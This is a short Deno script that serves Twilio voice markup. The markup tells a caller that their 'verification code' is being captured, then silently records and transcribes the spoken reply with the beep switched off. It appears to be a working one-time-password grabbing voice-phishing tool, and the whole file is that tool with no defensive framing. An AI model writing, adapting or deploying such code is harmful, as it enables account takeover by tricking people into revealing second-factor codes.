Deno.serve(() => {
  const twiml = `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say voice="alice">Please hold while we capture your verification code.</Say>
  <Pause length="1"/>
  <Record transcribe="true" maxLength="30" timeout="15" playBeep="false"/>
</Response>`;
  return new Response(twiml, { headers: { "Content-Type": "text/xml" } });
});
